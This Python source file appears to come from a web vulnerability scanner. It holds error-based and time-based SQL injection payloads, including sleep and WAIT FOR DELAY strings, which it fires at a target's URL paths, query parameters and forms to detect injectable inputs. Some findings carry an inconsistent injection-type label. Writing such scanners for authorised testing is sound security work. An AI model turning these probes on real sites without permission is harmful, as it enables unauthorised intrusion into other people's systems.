import urllib
import urllib.parse as urlparse
from copy import deepcopy
from datetime import datetime
from typing import List

from Managers.CacheManager import CacheManager
from Managers.RequestHandler import RequestHandler
from Managers.ThreadManager import ThreadManager
from Models.FormRequestDTO import FormRequestDTO
from Models.GetRequestDTO import GetRequestDTO
from Models.InjectionFoundDTO import InjectionType, InjectionFoundDTO


class SqliManager:
    def __init__(self, domain, cookies='', headers={}):
        self._result = None
        self._domain = domain
        self._false_positives = ['malformed request syntax',
                                 'eval|internal|range|reference|syntax|type']
        self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
        self._time_based_payloads = [
            {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\'',
             'True2Pld': '\'OR(if(2=2,sleep(5),0))OR\''},
            {'TruePld': '\'OR(if(1=1,sleep(5),0))--%20-', 'FalsePld': '\'OR(if(1=2,sleep(5),0))--%20-',
             'True2Pld': 'OR(if(2=2,sleep(5),0))--%20-'},
            {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01',
             'True2Pld': '1; WAIT FOR DELAY \'00:00:08'},
        ]
        self._delay_in_seconds = 5
        self._request_handler = RequestHandler(cookies, headers)
        self._injections_to_check = [' syntax', 'xpath', 'internalerror', 'warning: ', 'exception: ']
        self.errors_for_eyewitness = []

    def check_get_requests(self, dtos: List[GetRequestDTO]):

        cache_manager = CacheManager('SqliManager', self._domain)
        self._result = cache_manager.get_saved_result()

        if self._result is None:
            self._result: List[InjectionFoundDTO] = []

            thread_man = ThreadManager()
            thread_man.run_all(self.__check_url, dtos)
            thread_man.run_all(self.__check_get_params, dtos)

            cache_manager.save_result(self._result, has_final_result=True)

        print(
            f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) SqliManager GET found {len(self._result)} items')

    def check_form_requests(self, form_dtos: List[FormRequestDTO]):

        cache_manager = CacheManager('SqliManager/Form', self._domain)
        self._result = cache_manager.get_saved_result()

        if self._result is None:
            self._result: List[InjectionFoundDTO] = []

            thread_man = ThreadManager()
            thread_man.run_all(self.__check_form, form_dtos)

            cache_manager.save_result(self._result, has_final_result=True)

        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) Found FORM SQLi: {len(self._result)}')

    def __check_form(self, dto: FormRequestDTO):
        for form in dto.form_params:
            if form.method_type == "POST":
                for param in form.params:
                    copy_form_params = deepcopy(form.params)
                    prev_param = copy_form_params[param]
                    for payload in self._error_based_payloads:
                        copy_form_params[param] = payload

                        response = self._request_handler.handle_request(dto.url, post_data=copy_form_params)
                        if response is None:
                            copy_form_params[param] = prev_param
                            continue

                        need_to_discard_payload = self.__check_keywords(response,
                                                                        dto.url,
                                                                        InjectionType.Sqli_PostForm_Error,
                                                                        post_payload=copy_form_params,
                                                                        original_post_params=form.params)

                        if need_to_discard_payload:
                            copy_form_params[param] = prev_param
                    for payloads in self._time_based_payloads:
                        self.__send_form_time_based(payloads, form.params, param, dto.url)

            elif form.method_type == "GET":
                parsed = urlparse.urlparse(dto.url)
                url_ending = len(form.action) * -1
                if len(parsed[2]) >= len(form.action) and str(parsed[2])[url_ending:] == form.action:
                    url = f'{parsed[0]}://{parsed[1]}{parsed[2]}?'
                else:
                    url = form.action + '?'
                for param in form.params:
                    for payload in self._error_based_payloads:
                        prev_url = url
                        url += f'{param}={payload}&'

                        response = self._request_handler.handle_request(url)
                        if response is None:
                            continue

                        self.__check_keywords(response,
                                              url,
                                              InjectionType.Ssti_Get,
                                              original_url=dto.url)

                        if response.status_code == 400:
                            url = prev_url
            else:
                print("METHOD TYPE NOT FOUND: " + form.method_type)
                return

    def __check_url(self, dto: GetRequestDTO):

        parsed = urllib.parse.urlparse(dto.url)
        route_parts = [r for r in parsed.path.split('/') if r.strip()]
        route_url_payloads = []

        for index, part in enumerate(route_parts):
            for payload in self._error_based_payloads:
                payload_part = f'{part}{payload}'
                new_route_parts = deepcopy(route_parts)
                new_route_parts[index] = payload_part
                new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
                route_url_payloads.append(new_url)

        for url in route_url_payloads:
            self.__send_error_based_request(url, dto)

        route_time_based_payloads = []
        for index, part in enumerate(route_parts):
            for payloads in self._time_based_payloads:
                payload_part = f'{part}{payloads["TruePld"]}'
                new_route_parts = deepcopy(route_parts)
                new_route_parts[index] = payload_part
                true_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'

                payload_part = f'{part}{payloads["FalsePld"]}'
                new_route_parts = deepcopy(route_parts)
                new_route_parts[index] = payload_part
                false_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'

                payload_part = f'{part}{payloads["True2Pld"]}'
                new_route_parts = deepcopy(route_parts)
                new_route_parts[index] = payload_part
                true2_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'

                route_time_based_payloads.append([true_new_url, false_new_url, true2_new_url])

        for payloads in route_time_based_payloads:
            self.__send_time_based_request(payloads[0], payloads[1], payloads[2])

    def __check_get_params(self, dto: GetRequestDTO):
        error_based_payloads_urls = set()
        time_based_payloads_urls = set()
        parsed = urlparse.urlparse(dto.url)
        queries = filter(None, parsed.query.split("&"))

        for query in queries:
            param_split = query.split('=')
            main_url_split = dto.url.split(query)
            for payloads in self._time_based_payloads:
                time_based_payloads_urls.add(
                    (f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
                     f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}',
                     f'{main_url_split[0]}{param_split[0]}={payloads["True2Pld"]}{main_url_split[1]}'))

            for payload in self._error_based_payloads:
                error_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')

        for payload in error_based_payloads_urls:
            self.__send_error_based_request(payload, dto)

        for payloads in time_based_payloads_urls:
            self.__send_time_based_request(payloads[0], payloads[1], payloads[2])

    def __send_error_based_request(self, url, dto: GetRequestDTO):
        try:
            response = self._request_handler.handle_request(url)
            if response is None:
                return

            self.__check_keywords(response, url, InjectionType.Sqli_Get_Error, original_url=dto.url)

        except Exception as inst:
            print(f"Exception - ({url}) - {inst}")

    def __send_time_based_request(self, true_payload, false_payload, true_2payload):
        response1 = self._request_handler.handle_request(true_payload)
        if response1 is not None and response1.elapsed.total_seconds() >= self._delay_in_seconds:
            response2 = self._request_handler.handle_request(false_payload)
            if response2 is not None and response2.elapsed.total_seconds() < self._delay_in_seconds:
                response3 = self._request_handler.handle_request(true_2payload)
                if response3 is not None and response3.elapsed.total_seconds() >= self._delay_in_seconds:
                    msg = f"SQLiManager delay FOUND! TRUE:{true_payload} ; FALSE:{false_payload}"
                    print(msg)
                    return self._result.append(
                        InjectionFoundDTO(InjectionType.Sqli_Get_Time, true_payload, 'TIME_BASED', response1.text, msg))

    def __check_keywords(self, response, url_payload, inj_type: InjectionType,
                         post_payload=None,
                         original_url: str = None,
                         original_post_params=None):
        web_page = response.text.lower()
        need_to_discard_payload = False
        for keyword in self._injections_to_check:
            if keyword in web_page and not any(word in web_page for word in self._false_positives):

                if original_url is not None:
                    check_response = self._request_handler.handle_request(original_url)
                else:
                    check_response = self._request_handler.handle_request(url_payload, post_data=original_post_params)

                if check_response is None or keyword in check_response.text.lower():
                    return

                substr_index = web_page.find(keyword)
                start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                last_index = substr_index + 50 if substr_index + 50 < len(web_page) else substr_index
                log_header_msg = f'injFOUND: {keyword}; ' \
                                 f'URL: {url_payload}; ' \
                                 f'DETAILS: {web_page[start_index:last_index]};'
                curr_resp_length = len(web_page)

                if not any(dto.response_length == curr_resp_length and dto.details_msg == log_header_msg
                           for dto in self._result):
                    print(log_header_msg)
                    self._result.append(
                        InjectionFoundDTO(inj_type, url_payload, post_payload, web_page, log_header_msg))
                else:
                    print("Duplicate FORM SQLi: - " + url_payload)

                need_to_discard_payload = True

            if response.status_code == 500:
                print(f"SqliManager: 500 status - {url_payload}; DETAILS: {response.text[0:200]}")
                need_to_discard_payload = True
                self.errors_for_eyewitness.append({'url': url_payload, 'response': response})

        return need_to_discard_payload

    def __send_form_time_based(self, payloads, form_params, param, url):
        copy_form_params = deepcopy(form_params)
        prev_param = copy_form_params[param]
        copy_form_params[param] = payloads["TruePld"]
        response1 = self._request_handler.handle_request(url, post_data=copy_form_params)
        if response1 is not None and response1.elapsed.total_seconds() >= self._delay_in_seconds:

            copy_form_params = deepcopy(form_params)
            copy_form_params[param] = payloads["FalsePld"]
            response2 = self._request_handler.handle_request(url, post_data=copy_form_params)
            if response2 is not None and response2.elapsed.total_seconds() < self._delay_in_seconds:

                copy_form_params = deepcopy(form_params)
                copy_form_params[param] = payloads["True2Pld"]
                response3 = self._request_handler.handle_request(url, post_data=copy_form_params)
                if response3 is not None and response3.elapsed.total_seconds() >= self._delay_in_seconds:
                    msg = f"SQLiManager FORM delay FOUND! TRUE:{payloads['TruePld']} ; FALSE:{payloads['FalsePld']}"
                    print(msg)
                    self._result.append(
                        InjectionFoundDTO(InjectionType.Sqli_PostForm_Time, url, copy_form_params,
                                          response1.text, msg))

